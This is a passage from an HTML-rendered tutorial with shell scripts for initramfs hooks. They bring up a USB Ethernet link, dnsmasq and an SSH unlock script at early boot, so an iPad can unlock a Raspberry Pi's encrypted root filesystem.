&lt;span id=&quot;cb14-4&quot;&gt;&lt;a href=&quot;#cb14-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-5&quot;&gt;&lt;a href=&quot;#cb14-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;prereqs()&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-6&quot;&gt;&lt;a href=&quot;#cb14-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$PREREQ&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-7&quot;&gt;&lt;a href=&quot;#cb14-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-8&quot;&gt;&lt;a href=&quot;#cb14-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-9&quot;&gt;&lt;a href=&quot;#cb14-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt; in&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-10&quot;&gt;&lt;a href=&quot;#cb14-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    prereqs&lt;span class=&quot;kw&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-11&quot;&gt;&lt;a href=&quot;#cb14-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;ex&quot;&gt;prereqs&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-12&quot;&gt;&lt;a href=&quot;#cb14-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt; 0&lt;/span&gt;
&lt;span id=&quot;cb14-13&quot;&gt;&lt;a href=&quot;#cb14-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-14&quot;&gt;&lt;a href=&quot;#cb14-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;esac&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-15&quot;&gt;&lt;a href=&quot;#cb14-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-16&quot;&gt;&lt;a href=&quot;#cb14-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;/usr/share/initramfs-tools/hooks-functions&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-17&quot;&gt;&lt;a href=&quot;#cb14-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-18&quot;&gt;&lt;a href=&quot;#cb14-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;copy_file&lt;/span&gt; script /usr/local/sbin/cryptroot-unlock-ssh.sh /usr/bin/cryptroot-unlock-ssh&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Create /usr/share/initramfs-tools/hooks/ipad:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb15&quot;&gt;&lt;pre class=&quot;sourceCode sh&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb15-1&quot;&gt;&lt;a href=&quot;#cb15-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-2&quot;&gt;&lt;a href=&quot;#cb15-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-3&quot;&gt;&lt;a href=&quot;#cb15-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;PREREQ=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-4&quot;&gt;&lt;a href=&quot;#cb15-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-5&quot;&gt;&lt;a href=&quot;#cb15-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;prereqs()&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-6&quot;&gt;&lt;a href=&quot;#cb15-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$PREREQ&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-7&quot;&gt;&lt;a href=&quot;#cb15-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-8&quot;&gt;&lt;a href=&quot;#cb15-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-9&quot;&gt;&lt;a href=&quot;#cb15-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt; in&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-10&quot;&gt;&lt;a href=&quot;#cb15-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    prereqs&lt;span class=&quot;kw&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-11&quot;&gt;&lt;a href=&quot;#cb15-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;ex&quot;&gt;prereqs&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-12&quot;&gt;&lt;a href=&quot;#cb15-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt; 0&lt;/span&gt;
&lt;span id=&quot;cb15-13&quot;&gt;&lt;a href=&quot;#cb15-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-14&quot;&gt;&lt;a href=&quot;#cb15-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;esac&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-15&quot;&gt;&lt;a href=&quot;#cb15-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-16&quot;&gt;&lt;a href=&quot;#cb15-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;/usr/share/initramfs-tools/hooks-functions&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-17&quot;&gt;&lt;a href=&quot;#cb15-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-18&quot;&gt;&lt;a href=&quot;#cb15-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;manual_add_modules&lt;/span&gt; dwc2 libcomposite usb_f_ecm&lt;/span&gt;
&lt;span id=&quot;cb15-19&quot;&gt;&lt;a href=&quot;#cb15-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;copy_file&lt;/span&gt; script /usr/local/sbin/usb0up.sh /usr/sbin/usb0up.sh&lt;/span&gt;
&lt;span id=&quot;cb15-20&quot;&gt;&lt;a href=&quot;#cb15-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;copy_file&lt;/span&gt; script /usr/local/sbin/usb0down.sh /usr/sbin/usb0down.sh&lt;/span&gt;
&lt;span id=&quot;cb15-21&quot;&gt;&lt;a href=&quot;#cb15-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-22&quot;&gt;&lt;a href=&quot;#cb15-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;copy_exec&lt;/span&gt; /usr/sbin/dnsmasq&lt;/span&gt;
&lt;span id=&quot;cb15-23&quot;&gt;&lt;a href=&quot;#cb15-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;copy_file&lt;/span&gt; config /etc/dnsmasq.d/ipad /etc/dnsmasq.conf&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Create /usr/share/initramfs-tools/scripts/init-top/ipad:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb16&quot;&gt;&lt;pre class=&quot;sourceCode sh&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb16-1&quot;&gt;&lt;a href=&quot;#cb16-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-2&quot;&gt;&lt;a href=&quot;#cb16-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-3&quot;&gt;&lt;a href=&quot;#cb16-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;PREREQ=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;udev&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-4&quot;&gt;&lt;a href=&quot;#cb16-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-5&quot;&gt;&lt;a href=&quot;#cb16-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;prereqs()&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-6&quot;&gt;&lt;a href=&quot;#cb16-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$PREREQ&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-7&quot;&gt;&lt;a href=&quot;#cb16-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-8&quot;&gt;&lt;a href=&quot;#cb16-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-9&quot;&gt;&lt;a href=&quot;#cb16-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt; in&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-10&quot;&gt;&lt;a href=&quot;#cb16-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    prereqs&lt;span class=&quot;kw&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-11&quot;&gt;&lt;a href=&quot;#cb16-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;ex&quot;&gt;prereqs&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-12&quot;&gt;&lt;a href=&quot;#cb16-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt; 0&lt;/span&gt;
&lt;span id=&quot;cb16-13&quot;&gt;&lt;a href=&quot;#cb16-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-14&quot;&gt;&lt;a href=&quot;#cb16-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;esac&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-15&quot;&gt;&lt;a href=&quot;#cb16-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-16&quot;&gt;&lt;a href=&quot;#cb16-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;/scripts/functions&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-17&quot;&gt;&lt;a href=&quot;#cb16-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-18&quot;&gt;&lt;a href=&quot;#cb16-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mount&lt;/span&gt; -t configfs none /sys/kernel/config&lt;/span&gt;
&lt;span id=&quot;cb16-19&quot;&gt;&lt;a href=&quot;#cb16-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-20&quot;&gt;&lt;a href=&quot;#cb16-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;/usr/sbin/usb0up.sh&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-21&quot;&gt;&lt;a href=&quot;#cb16-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-22&quot;&gt;&lt;a href=&quot;#cb16-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ipconfig&lt;/span&gt; -d &lt;span class=&quot;st&quot;&gt;&amp;quot;10.55.0.1:::255.255.255.248:kali:usb0&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-23&quot;&gt;&lt;a href=&quot;#cb16-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb16-24&quot;&gt;&lt;a href=&quot;#cb16-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;/usr/sbin/dnsmasq&lt;/span&gt; --local-service --user=root --pid-file=/run/dnsmasq.pid&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Create /usr/share/initramfs-tools/scripts/local-bottom/ipad:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb17&quot;&gt;&lt;pre class=&quot;sourceCode sh&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb17-1&quot;&gt;&lt;a href=&quot;#cb17-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-2&quot;&gt;&lt;a href=&quot;#cb17-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-3&quot;&gt;&lt;a href=&quot;#cb17-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;PREREQ=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-4&quot;&gt;&lt;a href=&quot;#cb17-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-5&quot;&gt;&lt;a href=&quot;#cb17-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;prereqs()&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-6&quot;&gt;&lt;a href=&quot;#cb17-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$PREREQ&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-7&quot;&gt;&lt;a href=&quot;#cb17-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-8&quot;&gt;&lt;a href=&quot;#cb17-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-9&quot;&gt;&lt;a href=&quot;#cb17-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt; in&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-10&quot;&gt;&lt;a href=&quot;#cb17-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    prereqs&lt;span class=&quot;kw&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-11&quot;&gt;&lt;a href=&quot;#cb17-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;ex&quot;&gt;prereqs&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-12&quot;&gt;&lt;a href=&quot;#cb17-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt; 0&lt;/span&gt;
&lt;span id=&quot;cb17-13&quot;&gt;&lt;a href=&quot;#cb17-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-14&quot;&gt;&lt;a href=&quot;#cb17-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;esac&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-15&quot;&gt;&lt;a href=&quot;#cb17-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-16&quot;&gt;&lt;a href=&quot;#cb17-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;/scripts/functions&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-17&quot;&gt;&lt;a href=&quot;#cb17-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-18&quot;&gt;&lt;a href=&quot;#cb17-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;kill&lt;/span&gt; -TERM &lt;span class=&quot;kw&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; /run/dnsmasq.pid&lt;span class=&quot;kw&quot;&gt;`&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-19&quot;&gt;&lt;a href=&quot;#cb17-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-20&quot;&gt;&lt;a href=&quot;#cb17-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ip&lt;/span&gt; link set dev usb0 down&lt;/span&gt;
&lt;span id=&quot;cb17-21&quot;&gt;&lt;a href=&quot;#cb17-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ip&lt;/span&gt; address flush dev usb0&lt;/span&gt;
&lt;span id=&quot;cb17-22&quot;&gt;&lt;a href=&quot;#cb17-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ip&lt;/span&gt; route flush dev usb0&lt;/span&gt;
&lt;span id=&quot;cb17-23&quot;&gt;&lt;a href=&quot;#cb17-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-24&quot;&gt;&lt;a href=&quot;#cb17-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;/usr/sbin/usb0down.sh&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-25&quot;&gt;&lt;a href=&quot;#cb17-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb17-26&quot;&gt;&lt;a href=&quot;#cb17-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;umount&lt;/span&gt; /sys/kernel/config&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Fix up permissions and finish setting things up:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb18&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb18-1&quot;&gt;&lt;a href=&quot;#cb18-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb18-2&quot;&gt;&lt;a href=&quot;#cb18-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb18-3&quot;&gt;&lt;a href=&quot;#cb18-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; -s&lt;/span&gt;
&lt;span id=&quot;cb18-4&quot;&gt;&lt;a href=&quot;#cb18-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb18-5&quot;&gt;&lt;a href=&quot;#cb18-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Make sure that new initramfs-tools scripts are executable.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb18-6&quot;&gt;&lt;a href=&quot;#cb18-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb18-7&quot;&gt;&lt;a href=&quot;#cb18-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;chmod&lt;/span&gt; +x /usr/local/sbin/cryptroot-unlock-ssh.sh&lt;/span&gt;
&lt;span id=&quot;cb18-8&quot;&gt;&lt;a href=&quot;#cb18-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;chmod&lt;/span&gt; +x /usr/share/initramfs-tools/hooks/cryptroot-ssh&lt;/span&gt;
&lt;span id=&quot;cb18-9&quot;&gt;&lt;a href=&quot;#cb18-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;chmod&lt;/span&gt; +x /usr/share/initramfs-tools/hooks/ipad&lt;/span&gt;
&lt;span id=&quot;cb18-10&quot;&gt;&lt;a href=&quot;#cb18-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;chmod&lt;/span&gt; +x /usr/share/initramfs-tools/scripts/init-top/ipad&lt;/span&gt;
&lt;span id=&quot;cb18-11&quot;&gt;&lt;a href=&quot;#cb18-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;chmod&lt;/span&gt; +x /usr/share/initramfs-tools/scripts/local-bottom/ipad&lt;/span&gt;
&lt;span id=&quot;cb18-12&quot;&gt;&lt;a href=&quot;#cb18-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb18-13&quot;&gt;&lt;a href=&quot;#cb18-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Regenerate initramfs.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb18-14&quot;&gt;&lt;a href=&quot;#cb18-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb18-15&quot;&gt;&lt;a href=&quot;#cb18-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;mkinitramfs&lt;/span&gt; -o /boot/initramfs.zst &lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;ls&lt;/span&gt; -1 /lib/modules &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;grep&lt;/span&gt; -e &lt;span class=&quot;st&quot;&gt;&amp;#39;-Re4son-v8l+$&amp;#39;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;tail&lt;/span&gt; -1&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb18-16&quot;&gt;&lt;a href=&quot;#cb18-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb18-17&quot;&gt;&lt;a href=&quot;#cb18-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb18-18&quot;&gt;&lt;a href=&quot;#cb18-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
